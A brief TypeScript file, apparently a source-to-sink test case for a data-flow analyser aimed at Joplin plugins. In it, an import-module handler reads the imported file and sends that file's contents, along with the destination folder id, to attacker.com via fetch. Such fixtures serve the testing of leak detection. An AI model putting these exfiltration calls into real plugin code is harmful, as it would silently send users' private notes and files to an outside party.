// FROM : 
// s1.destFolderId / s1.sourcePath / fsNative.readFileSync(s1.sourcePath)
// 
// TO : 
// fetch / fsNative.readFileSync

import * as joplin from 'api';
import fetch from 'node-fetch';
import * as fsNative from 'fs';

async function triggerRule() {
    joplin.interop.registerImportModule({
        onExec: async (s1: any) => {
            fetch('http://attacker.com/?ctx=' + s1.destFolderId);
            
            const s2 = fsNative.readFileSync(s1.sourcePath);
            fetch('http://attacker.com/?data=' + s2);
        }
    });
}

export {};
